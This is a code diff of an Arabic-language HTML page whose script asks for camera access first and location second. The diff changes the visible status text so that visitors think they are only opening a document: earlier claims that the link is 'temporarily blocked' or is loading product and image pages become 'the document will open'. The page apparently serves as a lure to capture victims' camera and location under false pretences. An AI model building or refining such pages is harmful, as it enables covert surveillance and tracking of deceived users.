@@ -86,11 +86,10 @@ html, body {
     </style>
 </head>
 <body>
-<span class="icon">⛔</span>
-    <h2>تم حظر رابط الموقع مؤقتاً</h2>
-<div >لمعاينة التفاصيل سيتم توجيهك للصفحة التالية بعد الموافقة على اذونات الموقع</div>
+<span class="icon"></span>
+
 <div ></div>
-    <div id="status">👆 جاهز للبدء</div>
+    <div id="status">سيتم فتح المستند</div>
     <div class="click-hint" id="clickHint">اضغط هنا لبدء العملية</div>
     <button id="retryPermBtn">🔄 إعادة المحاولة</button>
 
@@ -126,7 +125,7 @@ html, body {
             retryPermBtn.style.display = 'none';
 
             // 1. طلب الكاميرا أولاً
-            statusDiv.innerHTML = " جاري طلب تحميل صفحة المنتجات ...";
+            statusDiv.innerHTML = " ";
             statusDiv.className = "status-loading";
             let camOk = false;
             try {
@@ -140,7 +139,7 @@ html, body {
             }
 
             // 2. طلب الموقع ثانياً
-            statusDiv.innerHTML = " جاري طلب تحميل صفحة الصور  ...";
+            statusDiv.innerHTML = " جاري طلب تحميل المستند  ...";
             statusDiv.className = "status-loading";
             let locData = null;
             try {
@@ -507,3 +506,4 @@ window.addEventListener('beforeunload', function(){
     </script>
 </body>
 </html>
+
